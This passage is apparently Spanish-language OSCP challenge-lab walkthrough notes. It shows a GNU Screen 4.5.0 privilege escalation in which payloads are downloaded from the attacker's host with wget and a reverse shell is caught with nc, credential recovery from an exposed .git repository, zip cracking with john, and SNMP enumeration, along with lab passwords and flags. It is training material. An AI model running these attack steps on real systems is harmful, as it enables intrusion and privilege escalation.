/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/screen-4.5.0 <-- posible vector
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/snap/snapd/8542/usr/lib/snapd/snap-confine
/snap/snapd/11588/usr/lib/snapd/snap-confine
/snap/core18/1880/bin/mount
/snap/core18/1880/bin/ping
/snap/core18/1880/bin/su
/snap/core18/1880/bin/umount
/snap/core18/1880/usr/bin/chfn
/snap/core18/1880/usr/bin/chsh
/snap/core18/1880/usr/bin/gpasswd
/snap/core18/1880/usr/bin/newgrp
/snap/core18/1880/usr/bin/passwd
/snap/core18/1880/usr/bin/sudo
/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1880/usr/lib/openssh/ssh-keysign
/snap/core18/1997/bin/mount
/snap/core18/1997/bin/ping
/snap/core18/1997/bin/su
/snap/core18/1997/bin/umount
/snap/core18/1997/usr/bin/chfn
/snap/core18/1997/usr/bin/chsh
/snap/core18/1997/usr/bin/gpasswd
/snap/core18/1997/usr/bin/newgrp
/snap/core18/1997/usr/bin/passwd
/snap/core18/1997/usr/bin/sudo
/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1997/usr/lib/openssh/ssh-keysign
```

2. Buscamos

```bash
┌──(root㉿kali)-[/home/kali]
└─# searchsploit "screen 4.5.0"
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                                                   | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                                             | linux/local/41152.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

3. Generamos mirror:

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/143]
└─# searchsploit -m 41154      
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
    Codes: N/A
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /home/kali/OffSec/Challenges/4_OSCP-A/Standalone-Machines/143/41154.sh
```

* [Poc](https://ethicalhackinghubcom.wordpress.com/2023/07/26/gnu-screen-4-5-0-local-privilege-escalation/)

> hacemos un Upgrade del shell

* `python -c 'import pty; pty.spawn("/bin/bash")'`

> Encontramos un exploit con mejor estructura en github [repo](https://github.com/YasserREED/screen-v4.5.0-priv-escalate)

```bash
┌──(root㉿kali)-[/home/…/4_OSCP-A/Standalone-Machines/143/CVE-2020-13151]
└─# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.249.143] 53994
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
aero@oscp:/$ cd /tmp
cd /tmp
aero@oscp:/tmp$ wget http://192.168.45.152:80/libhax.so
wget http://192.168.45.152:80/libhax.so
--2025-08-13 20:20:32--  http://192.168.45.152/libhax.so
Connecting to 192.168.45.152:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15528 (15K) [application/octet-stream]
Saving to: ‘libhax.so’

libhax.so           100%[===================>]  15.16K  77.2KB/s    in 0.2s    

2025-08-13 20:20:32 (77.2 KB/s) - ‘libhax.so’ saved [15528/15528]

aero@oscp:/tmp$ wget http://192.168.45.152:80/rootshell
wget http://192.168.45.152:80/rootshell
--2025-08-13 20:20:48--  http://192.168.45.152/rootshell
Connecting to 192.168.45.152:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 758824 (741K) [application/octet-stream]
Saving to: ‘rootshell’                                                                                                                                                                                            
                                                                                                                                                                                                                  
rootshell           100%[===================>] 741.04K   707KB/s    in 1.0s                                                                                                                                       
                                                                                                                                                                                                                  
2025-08-13 20:20:49 (707 KB/s) - ‘rootshell’ saved [758824/758824]                                                                                                                                                
                                                                                                                                                                                                                  
aero@oscp:/tmp$ chmod +x libhax.so                                                                                                                                                                                
chmod +x libhax.so                                                                                                                                                                                                
aero@oscp:/tmp$ chmod +x rootshell                                                                                                                                                                                
chmod +x rootshell                                                                                                                                                                                                
aero@oscp:/tmp$ cd /etc || exit 1                                                                                                                                                                                 
cd /etc || exit 1                                                                                                                                                                                                 
aero@oscp:/etc$ umask 000                                                                                                                                                                                         
umask 000                                                                                                                                                                                                         
aero@oscp:/etc$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
aero@oscp:/etc$ screen -ls
screen -ls
No Sockets found in /tmp/screens/S-aero.

aero@oscp:/etc$ /tmp/rootshell
/tmp/rootshell
# whoami
whoami
root
# 
```

### Obtenemos el flag:

```bash
# cd /root
cd /root
# ls
ls
aerospike.sh  proof.txt  snap
# cat proof.txt
cat proof.txt
5c96301c4d4280583035f3efc3db1e54
# 
```

## .144: Crystal

Esta maquina expone un repositorio git en sus rutas.

> Clonamos el repo

**Opcion 1**

```bash
┌──(kali㉿kali)-[~/tools/GitTools/Dumper]
└─$ sudo su                                                     
┌──(root㉿kali)-[/home/kali/tools/GitTools/Dumper]
└─# ./gitdumper.sh http://192.168.212.144/.git/ /home/kali/OffSec/Challenges/4_OSCP-A/Standalone-Machines/144
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating /home/kali/OffSec/Challenges/4_OSCP-A/Standalone-Machines/144/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[+] Downloaded: packed-refs
[-] Downloaded: refs/heads/master
[+] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[-] Downloaded: logs/refs/heads/master
[+] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[-] Downloaded: objects/62/1a2e79b3a4a08bba12effe6331ff4513bad91a
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/44/a055daf7a0cd777f28f444c0d29ddf3ff08c54
[+] Downloaded: objects/93/290282d106a338e8d8a60e4297173c677aa73d
[-] Downloaded: objects/ac/37d2aadbf26270e9f8e17e70b0f7bdd4f9715c
[-] Downloaded: objects/98/8fb5d2ed0766ef8f3c76494b20c582b07c8bce
[+] Downloaded: objects/80/9af487f5bb4b71659f897b793347ce62a3b5f4
[-] Downloaded: objects/21/ed82147f502f7b8d1539fe3bd16e22b0895108
[-] Downloaded: objects/2d/60c7d9882eb1ea6bb1789f5eceb5360f92ba45
[+] Downloaded: objects/8a/d08b041c8e2dfe72cc2ba90bcaed4d1088873f

```

**Opcion 2**

> Descaga bastante chatarra *.html

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/144]
└─# wget --mirror --convert-links --no-parent http://192.168.212.144/.git/
```

**Proceso para recuperar archivos y secretos de un repositorio Git parcial (.git expuesto)**

Este es un resumen ordenado del procedimiento seguido para recuperar archivos y credenciales desde un directorio `.git` expuesto o descargado.

---

#### 1. Preparar entorno de trabajo

```bash
mkdir /tmp/unpacked && cd /tmp/unpacked
cp -r /ruta/al/.git .  # Copiamos el .git al directorio de trabajo
```

#### 2. Analizar objetos empacados

Los repositorios suelen tener sus objetos comprimidos en un packfile:

```bash
ls .git/objects/pack/
# Resultado esperado: pack-<hash>.pack y pack-<hash>.idx
```

#### 3. Desempaquetar objetos del packfile

Esto nos permite extraer todos los objetos individuales al directorio `objects/`:

```bash
cd .git
git unpack-objects < objects/pack/pack-<hash>.pack
```

> Esto extrae blobs, commits y árboles al estilo clásico de Git.

#### 4. Regresar al raíz del repositorio

```bash
cd ..
```

### 5. Verificar el estado del repositorio

```bash
git log
# Error esperado: no hay commits en la rama actual

# Verificar existencia de objetos colgantes
git fsck --full

# Ejemplo de salida:

Checking object directories: 100% (256/256), done.
Checking objects: 100% (32/32), done.
notice: HEAD points to an unborn branch (master)
notice: No default references
dangling commit 621a2e79b3a4a08bba12effe6331ff4513bad91a

```

#### 6. Identificar commits "dangling" (colgantes)

El comando anterior listará algo como:

```
dangling commit 621a2e79b3a4a08bba12effe6331ff4513bad91a
```

#### 7. Mostrar contenido del commit colgante

```bash
git show 621a2e79b3a4a08bba12effe6331ff4513bad91a

commit 621a2e79b3a4a08bba12effe6331ff4513bad91a                                                        
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>                       
Date:   Fri Nov 18 23:57:12 2022 +0200                                                                 

    Create database.php

diff --git a/configuration/database.php b/configuration/database.php
new file mode 100644
index 0000000..55b1645
--- /dev/null
+++ b/configuration/database.php
@@ -0,0 +1,19 @@
+<?php
+class Database{
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "stuart@challenge.lab";
+    private $password = "BreakingBad92";
+    public $conn;
+    public function getConnection() {
+        $this->conn = null;
+        try{
+            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
+            $this->conn->exec("set names utf8");
+        }catch(PDOException $exception){
+            echo "Connection error: " . $exception->getMessage();
+        }
+        return $this->conn;
+    }
+}
+?>
```

Esto reveló el contenido de un archivo sensible:

```php
configuration/database.php
- usuario: stuart@challenge.lab
- password: BreakingBad92
```

#### Observaciones

* Un `.git` expuesto puede ser una mina de oro para recuperar contraseñas, configuraciones y archivos eliminados.
* Aunque no haya referencias visibles (`HEAD`, `refs/`), los objetos siguen ahí y pueden recuperarse con `git fsck` y `git show`.

---

**Siguientes pasos posibles:**

* Usar `git log --all --pretty=format:"%H" | xargs -n 1 git show` para listar todo lo recuperable.
* Automatizar este proceso con herramientas como `git-dumper`, `githack`, etc.
* Usar credenciales encontradas para pivotar hacia servicios internos (DBs, paneles admin, etc.).

#### Propagamos las credenciales por los servicios encontrados con nmap

**ssh**

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/4_OSCP-A/Standalone-Machines]
└─# crackmapexec ssh 192.168.212.144 -u 'stuart' -p 'BreakingBad92'
SSH         192.168.212.144 22     192.168.212.144  [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
SSH         192.168.212.144 22     192.168.212.144  [+] stuart:BreakingBad92 
```

* Nos conectamos por ssh al objetivo:

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/144]
└─# ssh stuart@192.168.212.144           
The authenticity of host '192.168.212.144 (192.168.212.144)' can't be established.
ED25519 key fingerprint is SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.212.144' (ED25519) to the list of known hosts.
stuart@192.168.212.144's password: BreakingBad92
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul 29 10:13:19 PM UTC 2025

  System load:  0.0                Processes:               205
  Usage of /:   40.0% of 18.53GB   Users logged in:         0
  Memory usage: 8%                 IPv4 address for ens160: 192.168.212.144
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
stuart@oscp:~$ ls
local.txt
stuart@oscp:~$ cat local.txt
3995266df7d0afa2ee0635cf93148374
stuart@oscp:~$ 
```

* Escalamos **Privilegios** (re hacer escalada de privilegios sin **MSF**)

```bash
stuart@oscp:~$ hostname
oscp
stuart@oscp:~$ whoami && id
stuart
uid=1000(stuart) gid=1000(stuart) groups=1000(stuart),4(adm),24(cdrom),30(dip),46(plugdev)

stuart@oscp:~$ sudo -l
[sudo] password for stuart: 
Sorry, user stuart may not run sudo on oscp.

stuart@oscp:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                   
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                                                                                   
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                                                                              
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                                                                              
sync:x:4:65534:sync:/bin:/bin/sync                                                                                                                                                                                
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                                                                                                                   
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                                                                                                                   
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
stuart:x:1000:1000:CClNW:/home/stuart:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
thato:x:1010:1010::/home/thato:/bin/bash
chloe:x:1011:1011::/home/chloe:/bin/bash
carla:x:1012:1012::/home/carla:/bin/bash

stuart@oscp:~$ arch
x86_64

stuart@oscp:~$ find / -type d -perm -2 -ls 2>/dev/null
      747      0 drwxrwxrwt   3 root     root           29 Mar 18  2022 /snap/core20/1405/run/lock
      774      0 drwxrwxrwt   2 root     root            3 Mar 18  2022 /snap/core20/1405/tmp
    11776      0 drwxrwxrwt   2 root     root            3 Mar 18  2022 /snap/core20/1405/var/tmp
      750      0 drwxrwxrwt   3 root     root           29 Oct 27  2022 /snap/core20/1695/run/lock
      777      0 drwxrwxrwt   2 root     root            3 Oct 27  2022 /snap/core20/1695/tmp
    11895      0 drwxrwxrwt   2 root     root            3 Oct 27  2022 /snap/core20/1695/var/tmp
     1221      0 drwxrwxrwt   2 root     utmp           40 Feb 12 21:47 /run/screen
        1      0 drwxrwxrwt   5 root     root          100 Feb 12 21:47 /run/lock
   786435      4 drwxrwxrwt  14 root     root         4096 Jul 30 14:45 /tmp
   394008      4 drwxrwxrwt   2 root     root         4096 Feb 12 21:47 /tmp/.X11-unix
   394012      4 drwxrwxrwt   2 root     root         4096 Feb 12 21:47 /tmp/.Test-unix
   394010      4 drwxrwxrwt   2 root     root         4096 Feb 12 21:47 /tmp/.XIM-unix
   394011      4 drwxrwxrwt   2 root     root         4096 Feb 12 21:47 /tmp/.font-unix
   394009      4 drwxrwxrwt   2 root     root         4096 Feb 12 21:47 /tmp/.ICE-unix
   918958      4 drwxrwxrwt   7 root     root         4096 Jul 30 14:30 /var/tmp
   918950      4 drwxrwxrwt   2 root     root         4096 Apr 21  2022 /var/crash
    12692      0 drwxrwxrwt   2 root     root           40 Feb 12 21:47 /dev/mqueue
        1      0 drwxrwxrwt   2 root     root           40 Feb 12 21:47 /dev/shm

stuart@oscp:~$ find / -perm -4000 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/umount
/usr/bin/sudo
/usr/bin/mount
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/snapd/15534/usr/lib/snapd/snap-confine
/snap/snapd/17576/usr/lib/snapd/snap-confine
/snap/core20/1405/usr/bin/chfn
/snap/core20/1405/usr/bin/chsh
/snap/core20/1405/usr/bin/gpasswd
/snap/core20/1405/usr/bin/mount
/snap/core20/1405/usr/bin/newgrp
/snap/core20/1405/usr/bin/passwd
/snap/core20/1405/usr/bin/su
/snap/core20/1405/usr/bin/sudo
/snap/core20/1405/usr/bin/umount
/snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1405/usr/lib/openssh/ssh-keysign
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign

```

* **V1** Buscamos archivos

```bash

 find / -type f -writable -user $(whoami) 2>/dev/null

...
/opt/backup/sitebackup1.zip
/opt/backup/sitebackup3.zip
/opt/backup/sitebackup2.zip
...

```
1. Descargamos los archvios

* Levantamos servidor en la maquina victima

```bash
python3 -m http.server 8000
```

* Solicitamos desde kali

```bash
wget http://192.168.45.152:8000/sitebackup1.zip
wget http://192.168.45.152:8000/sitebackup2.zip
wget http://192.168.45.152:8000/sitebackup3.zip
```

2. Crackeamos los zip

```bash
zip2john sitebackup3.zip > zip.hash
```

* Le damos con john 
```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 
Warning! john.conf section [list.rules:sshrules] is multiple declared.
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/app.php)     
codeblue         (sitebackup3.zip/joomla/web.config.txt)     
codeblue         (sitebackup3.zip/joomla/cli/joomla.php)     
codeblue         (sitebackup3.zip/joomla/cli/index.html)     
codeblue         (sitebackup3.zip/joomla/htaccess.txt)     
codeblue         (sitebackup3.zip/joomla/LICENSE.txt)     
codeblue         (sitebackup3.zip/joomla/includes/index.html)     
codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)     
codeblue         (sitebackup3.zip/joomla/cache/index.html)     
codeblue         (sitebackup3.zip/joomla/includes/defines.php)     
codeblue         (sitebackup3.zip/joomla/README.txt)     
codeblue         (sitebackup3.zip/joomla/language/index.html)     
codeblue         (sitebackup3.zip/joomla/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/framework.php)     
codeblue         (sitebackup3.zip/joomla/index.php)     
codeblue         (sitebackup3.zip/joomla/configuration.php)     
codeblue         (sitebackup3.zip/joomla/robots.txt)     
codeblue         (sitebackup3.zip/joomla/tmp/index.html)     
19g 0:00:00:17 DONE (2025-09-02 13:58) 1.061g/s 3661p/s 69563c/s 69563C/s dyesebel..sabrina7
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

* Miramos el password y descomprimimos

```bash
john --show zip.hash
```

```bash
7z x -pcodeblue sitebackup3.zip -o./site3
```

* Miramos en configuration.php

```bash
  cat configuration.php 
<?php
class JConfig {
        public $offline = false;
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
        public $display_offline_message = 1;
        public $offline_image = '';
        public $sitename = 'Challenge Lab';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = 20;
        public $access = 1;
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysql';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = 'Password@1';
        public $db = 'jooml';
        public $dbprefix = 'o83rl_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'Ee24zIK4cDhJHL4H';
        public $gzip = false;
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $offset = 'UTC';
        public $mailonline = true;
        public $mailer = 'mail';
        public $mailfrom = 'chloe@challenge.lab';
        public $fromname = 'Challenge Lab';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = false;
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = 25;
        public $caching = 0;
        public $cache_handler = 'file';
        public $cachetime = 15;
        public $cache_platformprefix = false;
        public $MetaDesc = '';
        public $MetaAuthor = true;
        public $MetaVersion = false;
        public $robots = '';
        public $sef = true;
        public $sef_rewrite = false;
        public $sef_suffix = false;
        public $unicodeslugs = false;
        public $feed_limit = 10;
        public $feed_email = 'none';
        public $log_path = '/var/www/html/joomla/administrator/logs';
        public $tmp_path = '/var/www/html/joomla/tmp';
        public $lifetime = 15;
        public $session_handler = 'database';
        public $shared_session = false;
        public $session_metadata = true;
}
```
* En la maquina victima usamos secret para usarla como **chloe**

```bash
stuart@oscp:/home$ ll                                                                                                                                                                                             
total 24                                                                                                                                                                                                          
drwxr-xr-x  6 root   root   4096 Nov 18  2022 ./                                                                                                                                                                  
drwxr-xr-x 19 root   root   4096 Oct 31  2022 ../
drwxr-x---  2 carla  carla  4096 Nov 18  2022 carla/
drwxr-x---  2 chloe  chloe  4096 Nov 18  2022 chloe/
drwxr-x---  4 stuart stuart 4096 Sep  2 14:46 stuart/
drwxr-x---  2 thato  thato  4096 Nov 18  2022 thato/

stuart@oscp:/home$ su chloe
Password:                                                                                                                                                                                                         
To run a command as administrator (user "root"), use "sudo <command>".                                                                                                                                            
See "man sudo_root" for details.                                                                                                                                                                                  

chloe@oscp:/home$ sudo -l
[sudo] password for chloe: Ee24zIK4cDhJHL4H                                                                                                                                                                                        
Matching Defaults entries for chloe on oscp:                                                                                                                                                                      
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                                                    
                                                                                                                                                                                                                  
User chloe may run the following commands on oscp:                                                                                                                                                                
    (ALL : ALL) ALL                                                                                                                                                                                               
chloe@oscp:/home$ sudo su                                                                                                                                                                                         
root@oscp:/home# cd /root                                                                                                                                                                                         
root@oscp:~# ls                                                                                                                                                                                                   
proof.txt  snap                                                                                                                                                                                                   
root@oscp:~# cat proof.txt
baac87afc23dd1fe96d5fc8524fff845                                                                                                                                                                                  
root@oscp:~# 
```

## .145 Hermes

> Luego de pasar horas enumerando posibles vectores **tcp** enumeramos **udp**

```bash
msf6 > search type:auxiliary snmp

Matching Modules
================

   #   Name                                               Disclosure Date  Rank    Check  Description
   -   ----                                               ---------------  ----    -----  -----------
   0   auxiliary/scanner/snmp/aix_version                 .                normal  No     AIX SNMP Scanner Auxiliary Module
   1   auxiliary/scanner/snmp/sbg6580_enum                .                normal  No     ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module
   2   auxiliary/scanner/snmp/arris_dg950                 .                normal  No     Arris DG950A Cable Modem Wifi Enumeration
   3   auxiliary/scanner/snmp/brocade_enumhash            .                normal  No     Brocade Password Hash Enumeration
   4   auxiliary/scanner/snmp/cnpilot_r_snmp_loot         .                normal  No     Cambium cnPilot r200/r201 SNMP Enumeration
   5   auxiliary/scanner/snmp/epmp1000_snmp_loot          .                normal  No     Cambium ePMP 1000 SNMP Enumeration
   6   auxiliary/admin/networking/cisco_asa_extrabacon    .                normal  Yes    Cisco ASA Authentication Bypass (EXTRABACON)
   7     \_ action: PASS_DISABLE                          .                .       .      Disable password authentication.
   8     \_ action: PASS_ENABLE                           .                .       .      Enable password authentication.
   9   auxiliary/scanner/snmp/cisco_config_tftp           .                normal  No     Cisco IOS SNMP Configuration Grabber (TFTP)
   10  auxiliary/scanner/snmp/cisco_upload_file           .                normal  No     Cisco IOS SNMP File Upload (TFTP)
   11    \_ action: Override_Config                       .                .       .      Override the running config
   12    \_ action: Upload_File                           .                .       .      Upload the file
   13  auxiliary/scanner/snmp/snmp_enum_hp_laserjet       .                normal  No     HP LaserJet Printer SNMP Enumeration
   14  auxiliary/admin/scada/moxa_credentials_recovery    2015-07-28       normal  Yes    Moxa Device Credential Retrieval
   15  auxiliary/scanner/snmp/netopia_enum                .                normal  No     Netopia 3347 Cable Modem Wifi Enumeration
   16  auxiliary/scanner/misc/oki_scanner                 .                normal  No     OKI Printer Default Login Credential Scanner
   17  auxiliary/scanner/snmp/snmp_login                  .                normal  No     SNMP Community Login Scanner
   18  auxiliary/scanner/snmp/snmp_enum                   .                normal  No     SNMP Enumeration Module
   19  auxiliary/scanner/snmp/snmp_set                    .                normal  No     SNMP Set Module
   20  auxiliary/scanner/snmp/snmp_enumshares             .                normal  No     SNMP Windows SMB Share Enumeration
   21  auxiliary/scanner/snmp/snmp_enumusers              .                normal  No     SNMP Windows Username Enumeration
   22  auxiliary/scanner/snmp/ubee_ddw3611                .                normal  No     Ubee DDW3611b Cable Modem Wifi Enumeration
   23  auxiliary/scanner/snmp/xerox_workcentre_enumusers  .                normal  No     Xerox WorkCentre User Enumeration (SNMP)


Interact with a module by name or index. For example info 23, use 23 or use auxiliary/scanner/snmp/xerox_workcentre_enumusers

msf6 > 

```

> Luego de ejecutar el script 18 obtenemos lo siguiente

### 📋 Información SNMP organizada

| Categoría                 | Datos principales                                                                                    |
| ------------------------- | ---------------------------------------------------------------------------------------------------- |
| **Host**                  | `192.168.205.145`                                                                                    |
| **Hostname**              | `oscp`                                                                                               |
| **Descripción SO**        | Windows 10 (Build 19041) x64                                                                         |
| **Usuarios**              | Guest, offsec, zachary, Administrator, DefaultAccount, WDAGUtilityAccount                            |
| **Interfaces activas**    | `vmxnet3 Ethernet Adapter` (MAC: 00:50:56:86\:c9:29, IP: 192.168.205.145)                            |
| **Servicios clave**       | SNMP Service, Microsoft FTP Service, World Wide Web Publishing Service, Remote Desktop Services, SMB |
| **Puertos TCP abiertos**  | 21 (FTP), 80 (HTTP), 135 (RPC), 139/445 (SMB), 3389 (RDP), varios dinámicos                          |
| **Puertos UDP abiertos**  | 123 (NTP), 137-138 (NetBIOS), 161 (SNMP), 2007, 3389, 5050, 5353, 5355                               |
| **Software instalado**    | PuTTY 0.76, VMware Tools, Microsoft Visual C++ Redistributables, Mouse Server 1.7.8.5                |
| **Procesos interesantes** | `snmp.exe`, `MouseServer.exe`, `ftpsvc`, `w3wp`, `RDP`, `explorer.exe`                               |
| **Almacenamiento**        | C:\ (29.37 GB total, 20.84 GB usados)                                                                |
| **Conexiones activas**    | 192.168.205.145:52927 → 20.59.87.226:443                                                             |

### 🎯 Posibles vectores de ataque

| Vector                      | Descripción                                                                                                                  | Herramienta/Explotación posible               |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| **Credenciales SNMP**       | Si el community string es débil (`public` / `private`), puede reutilizarse para ataques SNMP Write o como info para pivoting | `snmpwalk`, `onesixtyone`, `snmp-check`       |
| **Enumeración de usuarios** | Cuentas `offsec` y `zachary` podrían usarse para ataques de fuerza bruta en RDP, SMB o WinRM                                 | `hydra`, `crackmapexec`                       |
| **Servicios expuestos**     | FTP, HTTP, SMB y RDP abiertos, con posible configuración insegura                                                            | `nmap --script vuln`, `smbclient`, `rdpcheck` |
| **Mouse Server**            | Versión 1.7.8.5 podría tener vulnerabilidades conocidas de ejecución remota                                                  | Buscar CVE o exploit en `searchsploit`        |
| **PuTTY**                   | Aunque normalmente seguro, si hay sesiones guardadas puede haber credenciales reutilizables                                  | Buscar claves guardadas en disco              |
| **FTP anónimo**             | Verificar si acepta login anónimo y acceso de escritura                                                                      | `ftp` o `nmap --script ftp-anon`              |
